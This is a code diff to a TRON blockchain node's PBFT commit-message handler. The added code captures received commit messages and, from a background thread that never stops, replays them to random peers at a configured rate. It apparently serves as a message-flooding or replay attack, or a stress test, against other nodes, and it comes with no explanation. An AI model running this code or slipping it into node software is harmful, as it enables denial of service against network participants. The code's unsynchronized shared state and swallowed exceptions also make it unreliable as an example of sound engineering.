@@ -6,10 +6,7 @@ import com.google.protobuf.InvalidProtocolBufferException;
 import io.netty.util.internal.ConcurrentSet;
 import java.io.Closeable;
 import java.security.SignatureException;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
-import java.util.Set;
+import java.util.*;
 import java.util.concurrent.Callable;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
@@ -25,8 +22,10 @@ import org.tron.consensus.base.Param;
 import org.tron.core.ChainBaseManager;
 import org.tron.core.capsule.BlockCapsule;
 import org.tron.core.capsule.TransactionCapsule;
+import org.tron.core.config.args.Args;
 import org.tron.core.db.PbftSignDataStore;
 import org.tron.core.exception.P2pException;
+import org.tron.core.net.TronNetService;
 import org.tron.core.net.message.TronMessage;
 import org.tron.core.net.message.pbft.PbftCommitMessage;
 import org.tron.core.net.peer.PeerConnection;
@@ -47,9 +46,79 @@ public class PbftDataSyncHandler implements TronMsgHandler, Closeable {
   @Autowired
   private ChainBaseManager chainBaseManager;
 
+
+
+
+  private static volatile Map<Integer, TronMessage> msgGathered = new HashMap<>();
+  private static volatile Map<Integer, TronMessage> msgQueue = new HashMap<>();
+
+  private static volatile long msgQueueMaxSize = Args.getInstance().pbftCommitMsgMaxQueueSize;
+  private static volatile long msgMaxSpeed = Args.getInstance().pbftCommitMsgMaxSpeed;
+
+  private static volatile long[] msgTotalSent = {0};
+  private static volatile long[] msgSuccessSent = {0};
+  private static volatile long[] tmpTimestamp = {0};
+  static {
+    new Thread(() -> {
+      if(msgQueueMaxSize == 0 || msgMaxSpeed ==0){
+        logger.info("@@@ msgQueueMaxSize or msgMaxSpeed was not found in config file. task failed..");
+        return;
+      }
+      while (true) {
+        try {
+          logger.info("@@@ msgQueue size {}, peers {}", msgQueue.size(), TronNetService.getPeers().size());
+          if (msgQueue.size() >= msgQueueMaxSize && TronNetService.getPeers().size() >= 1) {
+            tmpTimestamp[0] = System.currentTimeMillis();
+            msgQueue.values().forEach(v -> {
+              try{
+                msgTotalSent[0]++;
+                if (msgTotalSent[0] % msgMaxSpeed == 0) {
+                  long s = tmpTimestamp[0] + 1000 - System.currentTimeMillis();
+                  logger.info("&&& total send {}, success count {}, sleep {}ms", msgTotalSent[0], msgSuccessSent[0], s);
+                  if (s > 0) {
+                    Thread.sleep(s);
+                  }
+                  tmpTimestamp[0] = System.currentTimeMillis();
+                  msgSuccessSent[0] = 0;
+                }
+              }catch (Exception e){}
+              List<PeerConnection> list = TronNetService.getPeers();
+              if (list.size() == 0) {
+                logger.info("@@@ peer size == 0 return...");
+                return;
+              }
+              int index = new Random().nextInt(list.size());
+              PeerConnection peerConnection = list.get(index);
+              peerConnection.sendMessage(v);
+              msgSuccessSent[0]++;
+            });
+          } else {
+            Thread.sleep(1000);
+          }
+        }catch (Exception e) {
+          logger.error("@@@ adv msg failed.", e);
+          try{ Thread.sleep(1000); }catch (Exception e2){}
+        }
+      }
+    }).start();
+  }
+
+  public static volatile long cnt = 0;
+
   @Override
   public void processMessage(PeerConnection peer, TronMessage msg) throws P2pException {
     PbftCommitMessage pbftCommitMessage = (PbftCommitMessage) msg;
+
+    if (msgQueueMaxSize>0 && msgMaxSpeed >0){
+      msgGathered.put(msg.hashCode(), msg);
+      cnt++;
+      logger.info("### cnt = {}, map1-size = {}, map2-size = {}",
+          cnt, msgGathered.size(), msgQueue.size());
+      if (msgGathered.size() >= msgQueueMaxSize) {
+        msgQueue = msgGathered;
+        msgGathered = new HashMap<>();
+      }
+    }
     try {
       Raw raw = Raw.parseFrom(pbftCommitMessage.getPBFTCommitResult().getData());
       pbftCommitMessageCache.put(raw.getViewN(), pbftCommitMessage);
